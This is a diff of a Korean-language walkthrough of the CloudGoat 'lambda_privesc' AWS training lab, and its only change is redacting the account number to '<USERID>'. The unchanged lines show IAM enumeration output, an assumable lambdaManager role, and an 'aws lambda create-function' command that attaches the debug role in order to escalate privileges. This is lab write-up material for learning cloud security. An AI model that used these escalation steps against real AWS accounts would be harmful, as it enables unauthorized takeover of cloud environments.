@@ -65,8 +65,8 @@ Command: $ ./cloudgoat.py create lambda_privesc
 ofile chris
 {
     "UserId": "AIDA2MALBVI56QS3BF452",
-    "Account": "712987748923",
-    "Arn": "arn:aws:iam::712987748923:user/chris-lambda_privesc_cgidejvizwx9mo"
+    "Account": "<USERID>",
+    "Arn": "arn:aws:iam::<USERID>:user/chris-lambda_privesc_cgidejvizwx9mo"
 }
 ```
 
@@ -76,7 +76,7 @@ ofile chris
 
 ```python
 User "chris-lambda_privesc_cgidejvizwx9mo" has 1 attached policies
-Policy "cg-chris-policy-lambda_privesc_cgidejvizwx9mo" (arn:aws:iam::712987748923:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo)
+Policy "cg-chris-policy-lambda_privesc_cgidejvizwx9mo" (arn:aws:iam::<USERID>:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo)
 User "chris-lambda_privesc_cgidejvizwx9mo" has 0 inline policies
 User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
 ```
@@ -88,7 +88,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
     "AttachedPolicies": [
         {
             "PolicyName": "cg-chris-policy-lambda_privesc_cgidejvizwx9mo",
-            "PolicyArn": "arn:aws:iam::712987748923:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo"
+            "PolicyArn": "arn:aws:iam::<USERID>:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo"
         }
     ]
 }
@@ -110,7 +110,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/aws-service-role/elasticloadbalancing.amazonaws.com/",
             "RoleName": "AWSServiceRoleForElasticLoadBalancing",
             "RoleId": "AROA2MALBVI57ZZNFYMTY",
-            "Arn": "arn:aws:iam::712987748923:role/aws-service-role/elasticloadbalancing.amazonaws.com/AWSServiceRoleForElasticLoadBalancing",
+            "Arn": "arn:aws:iam::<USERID>:role/aws-service-role/elasticloadbalancing.amazonaws.com/AWSServiceRoleForElasticLoadBalancing",
             "CreateDate": "2021-08-14T04:51:17+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -131,7 +131,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/aws-service-role/rds.amazonaws.com/",
             "RoleName": "AWSServiceRoleForRDS",
             "RoleId": "AROA2MALBVI5TMWNAS337",
-            "Arn": "arn:aws:iam::712987748923:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS",
+            "Arn": "arn:aws:iam::<USERID>:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS",
             "CreateDate": "2021-08-14T04:51:19+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -152,7 +152,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/aws-service-role/support.amazonaws.com/",
             "RoleName": "AWSServiceRoleForSupport",
             "RoleId": "AROA2MALBVI52DTL4XEGY",
-            "Arn": "arn:aws:iam::712987748923:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
+            "Arn": "arn:aws:iam::<USERID>:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
             "CreateDate": "2020-09-10T02:27:38+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -173,7 +173,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
             "RoleName": "AWSServiceRoleForTrustedAdvisor",
             "RoleId": "AROA2MALBVI5WDUNGWNAK",
-            "Arn": "arn:aws:iam::712987748923:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
+            "Arn": "arn:aws:iam::<USERID>:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
             "CreateDate": "2020-09-10T02:27:38+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -194,7 +194,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/",
             "RoleName": "cg-debug-role-lambda_privesc_cgidejvizwx9mo",
             "RoleId": "AROA2MALBVI566QQGU2JJ",
-            "Arn": "arn:aws:iam::712987748923:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo",
+            "Arn": "arn:aws:iam::<USERID>:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo",
             "CreateDate": "2021-08-18T01:11:47+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -215,7 +215,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
             "Path": "/",
             "RoleName": "cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
             "RoleId": "AROA2MALBVI52NOERA357",
-            "Arn": "arn:aws:iam::712987748923:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
+            "Arn": "arn:aws:iam::<USERID>:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
             "CreateDate": "2021-08-18T01:11:56+00:00",
             "AssumeRolePolicyDocument": {
                 "Version": "2012-10-17",
@@ -224,7 +224,7 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
                         "Sid": "",
                         "Effect": "Allow",
                         "Principal": {
-                            "AWS": "arn:aws:iam::712987748923:user/chris-lambda_privesc_cgidejvizwx9mo"
+                            "AWS": "arn:aws:iam::<USERID>:user/chris-lambda_privesc_cgidejvizwx9mo"
                         },
                         "Action": "sts:AssumeRole"
                     }
@@ -241,11 +241,11 @@ User "chris-lambda_privesc_cgidejvizwx9mo" has 0 groups associated
 ```python
 lambdaManager
 "RoleName": "cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
-"Arn": "arn:aws:iam::712987748923:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
+"Arn": "arn:aws:iam::<USERID>:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo",
 
 Debug
 "RoleName": "cg-debug-role-lambda_privesc_cgidejvizwx9mo",
-"Arn": "arn:aws:iam::712987748923:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo",
+"Arn": "arn:aws:iam::<USERID>:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo",
 ```
 
 - 앞에서 분석하였던 두 데이터를 통해 각각 접근된 정책들에대해 조회를 하였습니다.
@@ -302,7 +302,7 @@ def lambda_handler(evt, cont):
 aws lambda create-function \
 	--function-name admin_function \
 	--runtime python3.6 \
-	--role arn:aws:iam::712987748923:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo \
+	--role arn:aws:iam::<USERID>:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo \
 	--handler lambda_function.lambda_handler \
 	--zip-file fileb://lambda_function.py.zip \
 	--profile lambdaManager
